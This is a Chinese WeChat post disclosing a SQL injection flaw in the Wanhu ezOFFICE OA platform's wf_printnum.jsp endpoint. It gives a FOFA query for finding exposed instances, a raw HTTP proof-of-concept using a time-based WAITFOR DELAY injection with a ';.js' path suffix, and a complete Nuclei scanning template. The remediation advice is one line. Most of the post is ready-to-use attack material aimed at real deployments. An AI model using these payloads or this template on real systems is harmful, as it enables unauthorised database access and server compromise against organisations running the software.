#  万户 ezOFFICE wf_printnum.jsp SQL注入漏洞

原创 WLF  [ 伟大航路D ](javascript:void\(0\);)

**伟大航路D** ![]()

微信号 gh_c1fdc31f79ef

功能介绍 日常漏洞分享

____

___发表于_

免责声明：文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

![]()

**![]()**Ⅰ、漏洞描述

万户OA
ezoffice是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

万户 ezOFFICE wf_printnum.jsp 接口存在SQL注入漏洞，恶意攻击者可利用此漏洞获取数据库信息，获取服务器控制权限

![]()

 **![]()**Ⅱ、fofa语句

  * 

    
    
     app="ezOFFICE协同管理平台"

  

 **![]()**Ⅲ、漏洞复现  

POC

  *   *   *   *   *   *   * 

    
    
    GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close

 **1、构建poc**

![]()

  

 **![]()**Ⅳ、Nuclei-POC  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     id: WH-ezOFFICE-wf-printnum-jsp-SQL  
    info:  name:  万户 ezOFFICE wf_printnum.jsp存在SQL注入漏洞 未授权的攻击者可利用此漏洞获取数据库权限 深入利用可获取服务器权限  author: WLF  severity: high  metadata:     fofa-query: app="ezOFFICE协同管理平台"variables:  filename: "{{to_lower(rand_base(10))}}"  boundary: "{{to_lower(rand_base(20))}}"http:  - raw:      - |        GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:3%27-- HTTP/1.1        Host:{{Hostname}}        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36        Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8        Accept-Encoding: gzip, deflate        Accept-Language: zh-CN,zh;q=0.9        Connection: close  
      
            GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1        Host:{{Hostname}}        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36        Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8        Accept-Encoding: gzip, deflate        Accept-Language: zh-CN,zh;q=0.9        Connection: close  
      
            GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:7%27-- HTTP/1.1        Host:{{Hostname}}        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36        Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8        Accept-Encoding: gzip, deflate        Accept-Language: zh-CN,zh;q=0.9        Connection: close  
      
      
        matchers-condition: and    matchers:      - type: dsl        dsl:          - 'duration_1>=2 && duration_1<=5'          - 'duration_2>=4 && duration_2<=7'          - 'duration_3>=6 && duration_3<=9'      - type: dsl        dsl:           - 'contains_all(body, "0")'

![]()

 **![]()**Ⅴ、修复建议  

 **  
**

厂家已发布漏洞补丁，请及时前往官网更新  

 **  
**

 **  
**

  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 万户 ezOFFICE wf_printnum.jsp SQL注入漏洞

原创 WLF  [ 伟大航路D ](javascript:void\(0\);)

轻触阅读原文

![]()

伟大航路D

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

